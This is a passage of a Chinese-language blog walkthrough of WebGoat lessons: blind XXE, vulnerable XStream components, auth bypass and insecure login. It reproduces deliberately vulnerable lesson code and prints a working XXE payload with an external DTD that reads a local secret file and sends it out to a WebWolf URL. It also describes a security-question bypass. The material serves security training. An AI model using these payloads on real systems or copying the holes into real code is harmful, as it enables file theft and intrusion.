class="meta">@Value(&quot;$&#123;webgoat.user.directory&#125;&quot;)</span> String webGoatHomeDirectory, CommentsCache comments)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.webGoatHomeDirectory = webGoatHomeDirectory;</span><br><span class="line">        <span class="built_in">this</span>.comments = comments;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">createSecretFileWithRandomContents</span><span class="params">(WebGoatUser user)</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">fileContents</span> <span class="operator">=</span> <span class="string">&quot;WebGoat 8.0 rocks... (&quot;</span> + randomAlphabetic(<span class="number">10</span>) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">        userToFileContents.put(user,fileContents);</span><br><span class="line">        <span class="type">File</span> <span class="variable">targetDirectory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(webGoatHomeDirectory,<span class="string">&quot;/XXE/&quot;</span> + user.getUsername());</span><br><span class="line">        <span class="keyword">if</span> (!targetDirectory.exists())&#123;</span><br><span class="line">            targetDirectory.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Files.writeString(<span class="keyword">new</span> <span class="title class_">File</span>(targetDirectory,<span class="string">&quot;secret.txt&quot;</span>).toPath(),fileContents,UTF_8);</span><br><span class="line"><span class="comment">//            这里是在初始化时创建flag文件</span></span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            log.error(<span class="string">&quot;Unable to write &#x27;secret.txt&#x27; to &#x27;&#123;&#125;&quot;</span>,targetDirectory);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(path = &quot;xxe/blind&quot;,consumes = ALL_VALUE,produces = APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">addComment</span><span class="params">(<span class="meta">@RequestBody</span> String commentStr)</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">fileContentsForUser</span> <span class="operator">=</span> userToFileContents.getOrDefault(getWebSession().getUser(),<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (commentStr.contains(fileContentsForUser))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Comment</span> <span class="variable">comment</span> <span class="operator">=</span> comments.parseXml(commentStr);</span><br><span class="line">            <span class="keyword">if</span> (fileContentsForUser.contains(comment.getText()))&#123;</span><br><span class="line">                comment.setText(<span class="string">&quot;Nice try, you need to send the file to WebWolf&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            comments.addComment(comment,<span class="literal">false</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(e.toString()).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(WebGoatUser user)</span>&#123;</span><br><span class="line">        comments.reset(user);</span><br><span class="line">        userToFileContents.remove(user);</span><br><span class="line">        createSecretFileWithRandomContents(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先说过程 后解释</p>
<p>创建一个eval.dtd文件 </p>
<p>这里一看就是向外面带出数据的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload  &quot;&lt;!ENTITY send SYSTEM &#x27;http://127.0.0.1:9090/landing?text=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>通过webwolf上传并获取路径信息</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911180913447.png" alt="image-20220911180913447"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:9090/files/123456/eval.dtd</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///C:/Users/14980/.webgoat-8.2.3-SNAPSHOT/XXE/123456/secret.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % zxcv SYSTEM &quot;http://127.0.0.1:9090/files/123456/eval.dtd&quot;&gt;</span><br><span class="line">%zxcv;</span><br><span class="line">%payload;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;comment&gt;&lt;text&gt;&amp;send;&lt;/text&gt;&lt;/comment&gt;</span><br></pre></td></tr></table></figure>

<p>这里首先去获取一下secret.txt 文件内容 接着去获取一个dtd文件 在下面的&amp;send;就是引用 eval.dtd中的内容</p>
<p>这样就会接收到请求了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911181107673.png" alt="image-20220911181107673"></p>
<p>提交即可</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911181156536.png" alt="image-20220911181156536"></p>
<h2 id="vulnerable-components"><a href="#vulnerable-components" class="headerlink" title="vulnerable_components"></a>vulnerable_components</h2><h3 id="VulnerableComponents"><a href="#VulnerableComponents" class="headerlink" title="VulnerableComponents"></a>VulnerableComponents</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.vulnerable_components;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableComponents</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A6;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;vulnerable-components.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一关是前端组件 不需要后端代码</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911182441815.png" alt="image-20220911182441815"></p>
<h3 id="VulnerableComponentsLesson"><a href="#VulnerableComponentsLesson" class="headerlink" title="VulnerableComponentsLesson"></a>VulnerableComponentsLesson</h3><h3 id="ContactImpl"><a href="#ContactImpl" class="headerlink" title="ContactImpl"></a>ContactImpl</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.vulnerable_components;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ContactImpl</span>  <span class="keyword">implements</span> <span class="title class_">Contact</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String firstName;</span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.vulnerable_components;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Contact</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span>;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFirstName</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFirstName</span><span class="params">(String firstName)</span>;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLastName</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLastName</span><span class="params">(String lastName)</span>;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEmail</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEmail</span><span class="params">(String email)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="VulnerableComponentsLesson-1"><a href="#VulnerableComponentsLesson-1" class="headerlink" title="VulnerableComponentsLesson"></a>VulnerableComponentsLesson</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.vulnerable_components;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;vulnerable.hint&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableComponentsLesson</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/VulnerableComponents/attack1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span></span><br><span class="line">    AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String payload)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        xstream.setClassLoader(Contact.class.getClassLoader());</span><br><span class="line">        xstream.alias(<span class="string">&quot;contact&quot;</span>, ContactImpl.class);</span><br><span class="line">        xstream.ignoreUnknownElements();</span><br><span class="line">        <span class="type">Contact</span> <span class="variable">contact</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!StringUtils.isEmpty(payload)) &#123;</span><br><span class="line">                payload = payload.replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;&gt;&quot;</span>).replace(<span class="string">&quot; &lt;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            contact = (Contact) xstream.fromXML(payload);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;vulnerable-components.close&quot;</span>).output(ex.getMessage()).build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">null</span> != contact) &#123;</span><br><span class="line">                contact.getFirstName();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!(contact <span class="keyword">instanceof</span> ContactImpl)) &#123;</span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;vulnerable-components.success&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;vulnerable-components.success&quot;</span>).output(e.getMessage()).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;vulnerable-components.fromXML&quot;</span>).feedbackArgs(contact).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可能是由于java版本的问题 不可以创建XStream()对象我们先放一下 回头再看</p>
<p>主要讲了一个cve 其中也写了只在使用docker镜像时有效</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911192236151.png" alt="image-20220911192236151"></p>
<h2 id="auth-bypass"><a href="#auth-bypass" class="headerlink" title="auth_bypass"></a>auth_bypass</h2><h3 id="AuthBypass"><a href="#AuthBypass" class="headerlink" title="AuthBypass"></a>AuthBypass</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.auth_bypass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AuthBypass</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A7;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;auth-bypass.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="VerifyAccount"><a href="#VerifyAccount" class="headerlink" title="VerifyAccount"></a>VerifyAccount</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.auth_bypass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> org.jcodings.util.Hash;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.ServerException;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;auth-bypass.hints.verify.1&quot;, &quot;auth-bypass.hints.verify.2&quot;, &quot;auth-bypass.hints.verify.3&quot;, &quot;auth-bypass.hints.verify.4&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VerifyAccount</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> WebSession webSession;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    UserSessionData userSessionData;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(path = &quot;/auth-bypass/verify-account&quot;,produces = &#123;&quot;application/json&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String userId, <span class="meta">@RequestParam</span> String verifyMethod, HttpServletRequest req)</span><span class="keyword">throws</span> ServerException , IOException&#123;</span><br><span class="line">        <span class="type">AccountVerificationHelper</span> <span class="variable">verificationHelper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AccountVerificationHelper</span>();</span><br><span class="line">        Map&lt;String,String&gt; submittedAnswers = parseSecQuestions(req);</span><br><span class="line">        <span class="keyword">if</span> (verificationHelper.didUserLikelyCheat((HashMap) submittedAnswers))&#123;</span><br><span class="line"><span class="comment">//            判断用户是否作弊</span></span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;verify-account.cheated&quot;</span>)</span><br><span class="line">                    .output(<span class="string">&quot;Yes, you guessed correctly,but see the feedback message&quot;</span>)</span><br><span class="line">                    .build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (verificationHelper.verifyAccount(Integer.valueOf(userId),(HashMap)submittedAnswers))&#123;</span><br><span class="line">            userSessionData.setValue(<span class="string">&quot;account-verified-id&quot;</span>,userId);</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;verify-account.success&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;verify-account.failed&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, String&gt; <span class="title function_">parseSecQuestions</span><span class="params">(HttpServletRequest req)</span> &#123;</span><br><span class="line">        Map&lt;String,String&gt; userAnswers = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        List&lt;String &gt; paramNames = Collections.list(req.getParameterNames());</span><br><span class="line">        <span class="keyword">for</span> (String paramName : paramNames)&#123;</span><br><span class="line">            <span class="keyword">if</span> (paramName.contains(<span class="string">&quot;secQuestion&quot;</span>))&#123;</span><br><span class="line">                userAnswers.put(paramName,req.getParameter(paramName));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (HashMap) userAnswers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="AccountVerificationHelper"><a href="#AccountVerificationHelper" class="headerlink" title="AccountVerificationHelper"></a>AccountVerificationHelper</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.auth_bypass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AccountVerificationHelper</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Integer</span> <span class="variable">verifyUserId</span> <span class="operator">=</span> <span class="number">1223445</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String ,String &gt; userSecQuestions = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        userSecQuestions.put(<span class="string">&quot;secQuestion0&quot;</span>,<span class="string">&quot;Dr. Watson&quot;</span>);</span><br><span class="line">        userSecQuestions.put(<span class="string">&quot;secQuestion1&quot;</span>,<span class="string">&quot;Baker Street&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;Integer,Map&gt; secQuestionStore = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        secQuestionStore.put(verifyUserId,userSecQuestions);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">didUserLikelyCheat</span><span class="params">(HashMap&lt;String ,String&gt; submittedAnswers)</span>&#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">likely</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (submittedAnswers.size() == secQuestionStore.get(verifyUserId).size())&#123;</span><br><span class="line"><span class="comment">//            如果两个数量相同</span></span><br><span class="line">            likely = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((submittedAnswers.containsKey(<span class="string">&quot;secQuestion0&quot;</span>)&amp;&amp; submittedAnswers.get(<span class="string">&quot;secQuestion0&quot;</span>).equals(secQuestionStore.get(verifyUserId).get(<span class="string">&quot;secQuestion0&quot;</span>)))</span><br><span class="line">                &amp;&amp; (submittedAnswers.containsKey(<span class="string">&quot;secQuestion1&quot;</span>) &amp;&amp; submittedAnswers.get(<span class="string">&quot;secQuestion1&quot;</span>).equals(secQuestionStore.get(verifyUserId).get(<span class="string">&quot;secQuestion1&quot;</span>))) )&#123;</span><br><span class="line"><span class="comment">//            这里代表的是你不能直接看源码去拿到这两个值</span></span><br><span class="line">            likely = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            likely = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> likely;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span>  <span class="title function_">verifyAccount</span><span class="params">(Integer userId,HashMap&lt;String,String &gt; submittedQuestions)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size())&#123;</span><br><span class="line"><span class="comment">//            如果传入的答案和标准答案数量不相同</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (submittedQuestions.containsKey(<span class="string">&quot;secQuestion0&quot;</span>) &amp;&amp; !submittedQuestions.get(<span class="string">&quot;secQuestion0&quot;</span>).equals(secQuestionStore.get(verifyUserId).get(<span class="string">&quot;secQuestion0&quot;</span>)))&#123;</span><br><span class="line"><span class="comment">//            如果有这个值 并且和原先的值不相同</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (submittedQuestions.containsKey(<span class="string">&quot;secQuestion1&quot;</span>) &amp;&amp; !submittedQuestions.get(<span class="string">&quot;secQuestion1&quot;</span>).equals(secQuestionStore.get(verifyUserId).get(<span class="string">&quot;secQuestion1&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里只要两个没有预定义过的就可以绕过了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911201509403.png" alt="image-20220911201509403"></p>
<h2 id="insecure-login"><a href="#insecure-login" class="headerlink" title="insecure_login"></a>insecure_login</h2><h3 id="InsecureLogin"><a href="#InsecureLogin" class="headerlink" title="InsecureLogin"></a>InsecureLogin</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.insecure_login;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureLogin</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A7;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;insecure-login.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="InsecureLoginTask"><a href="#InsecureLoginTask" class="headerlink" title="InsecureLoginTask"></a>InsecureLoginTask</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.insecure_login;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureLoginTask</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/InsecureLogin/task&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String username,<span class="meta">@RequestParam</span> String password)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;CaptainJack&quot;</span>.equals(username) &amp;&amp; <span class="string">&quot;BlackPearl&quot;</span>.equals(password))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/InsecureLogin/login&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseStatus(HttpStatus.ACCEPTED)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911203004937.png" alt="image-20220911203004937"></p>
<p>输入就过</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911203105064.png" alt="image-20220911203105064"></p>
